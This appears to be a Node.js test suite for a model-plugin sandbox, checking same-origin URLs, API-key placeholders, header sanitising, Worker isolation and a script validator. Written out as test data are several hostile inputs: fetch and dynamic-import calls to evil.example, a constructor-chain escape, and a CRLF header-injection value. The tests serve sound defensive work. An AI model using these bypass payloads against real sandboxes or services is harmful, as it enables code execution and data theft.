import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { injectModelPluginCredential, MODEL_PLUGIN_API_KEY_PLACEHOLDER, normalizePluginImages, PLUGIN_TEMPLATES, resolveModelPluginResultUrl, resolveModelPluginUrl, sanitizeModelPluginHeaders, validateModelPluginScript } from "@/services/api/model-plugin";

const source = readFileSync(new URL("../src/services/api/model-plugin.ts", import.meta.url), "utf8");
const workerSource = readFileSync(new URL("../public/model-script-worker.js", import.meta.url), "utf8");
const nextConfigSource = readFileSync(new URL("../next.config.ts", import.meta.url), "utf8");

test("模型脚本请求只能访问当前渠道同源地址", () => {
    assert.equal(resolveModelPluginUrl("https://api.example.com", "/images/generations"), "https://api.example.com/v1/images/generations");
    assert.equal(resolveModelPluginUrl("https://api.example.com", "https://api.example.com/v1/models"), "https://api.example.com/v1/models");
    assert.throws(() => resolveModelPluginUrl("https://api.example.com", "https://evil.example/v1/models"), /同源/);
    assert.throws(() => resolveModelPluginUrl("http://api.example.com", "https://api.example.com/v1/models"), /同源/);
    assert.throws(() => resolveModelPluginUrl("https://api.example.com", "https://user:pass@api.example.com/v1/models"), /凭据/);
    assert.throws(() => resolveModelPluginUrl("https://api.example.com", "https://api.example.com/v1/models#secret"), /片段/);
    assert.throws(() => resolveModelPluginResultUrl("https://api.example.com", "https://evil.example/result.png"), /同源/);
});

test("Worker 只拿到密钥占位符，真实密钥由父线程注入请求头", () => {
    assert.deepEqual(injectModelPluginCredential({ authorization: `Bearer ${MODEL_PLUGIN_API_KEY_PLACEHOLDER}`, "x-api-key": MODEL_PLUGIN_API_KEY_PLACEHOLDER }, "real-key"), {
        authorization: "Bearer real-key",
        "x-api-key": "real-key",
    });
    assert.doesNotMatch(source, /apiKey:\s*args\.config\.apiKey/);
    assert.match(source, /apiKey:\s*MODEL_PLUGIN_API_KEY_PLACEHOLDER/);
});

test("模型脚本请求头不会覆盖宿主、Cookie 或代理边界", () => {
    assert.deepEqual(
        sanitizeModelPluginHeaders({ Host: "internal", Cookie: "sid=1", Origin: "https://evil.example", "Set-Cookie": "sid=1", "Keep-Alive": "timeout=5", "Proxy-Authenticate": "Basic", "X-Forwarded-For": "127.0.0.1", Authorization: "Bearer provider-key", "Content-Type": "application/json" }),
        { authorization: "Bearer provider-key", "content-type": "application/json" },
    );
    assert.throws(() => sanitizeModelPluginHeaders({ "x-too-long": "x".repeat(8193) }), /超过限制/);
    assert.throws(() => sanitizeModelPluginHeaders({ "x-injected": "safe\r\nHost: internal" }), /格式无效/);
});

test("脚本只在可终止 Worker 中执行且网络统一走渠道请求层", () => {
    assert.match(source, /new Worker\(/);
    assert.match(source, /worker\.terminate\(\)/);
    assert.match(source, /channelAxiosRequest/);
    assert.match(source, /FORBIDDEN_SCRIPT_GLOBALS/);
    assert.doesNotMatch(source, /new Function/);
    assert.match(workerSource, /new Function/);
    assert.match(source, /new Worker\(MODEL_PLUGIN_WORKER_URL/);
    assert.match(nextConfigSource, /source:\s*"\/model-script-worker\.js"/);
    assert.match(nextConfigSource, /connect-src 'none'/);
    assert.doesNotMatch(source, /axios\.request/);
});

test("内置 OpenAI 与 Gemini 模板均符合安全脚本边界", () => {
    Object.values(PLUGIN_TEMPLATES).flat().forEach((template) => assert.equal(validateModelPluginScript(template.script), template.script.trim()));
    assert.throws(() => validateModelPluginScript("fetch('https://evil.example')"), /被禁用/);
    assert.throws(() => validateModelPluginScript("new Worker('https://evil.example/a.js')"), /被禁用/);
    assert.throws(() => validateModelPluginScript("return import/* 绕过空白匹配 */('https://evil.example/a.js')"), /被禁用/);
    assert.throws(() => validateModelPluginScript("return import\n('https://evil.example/a.js')"), /被禁用/);
    assert.throws(() => validateModelPluginScript("return [].filter['con' + 'structor']('return this')()"), /被禁用/);
});

test("图片脚本结果只接受明确的图片返回形态", () => {
    assert.deepEqual(normalizePluginImages(["data:image/png;base64,AA==", { url: "https://api.example.com/a.png" }, { b64_json: "AA==" }]), [
        "data:image/png;base64,AA==",
        "https://api.example.com/a.png",
        "data:image/png;base64,AA==",
    ]);
    assert.throws(() => normalizePluginImages([{ data: "not-an-image" }, null]), /没有返回图片/);
});
